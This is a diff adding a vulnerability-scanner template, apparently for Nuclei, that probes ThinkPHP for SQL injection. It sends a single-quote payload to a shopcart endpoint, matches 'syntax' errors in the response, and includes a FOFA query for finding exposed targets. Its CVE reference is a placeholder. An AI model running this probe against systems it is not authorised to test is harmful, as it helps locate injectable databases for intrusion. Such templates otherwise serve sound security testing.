@@ -1,0 +1,24 @@
+id: thinkphp_multi_sql_leak_2
+
+info:
+  name: "ThinkPHP 多处SQL注入风险"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    该框架存在多个SQL注入风险点，攻击者可通过构造恶意请求获取数据库敏感信息
+      fofa: product="ThinkPHP" && (title="Index.php" || path="/Upload.ashx")
+      reference: 
+        - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-XXXXX
+  tags: ThinkPHP
+
+http:
+- raw:
+  - |
+    GET /index.php?s=/home/shopcart/getpriceNum/id/1%27 HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'syntax'
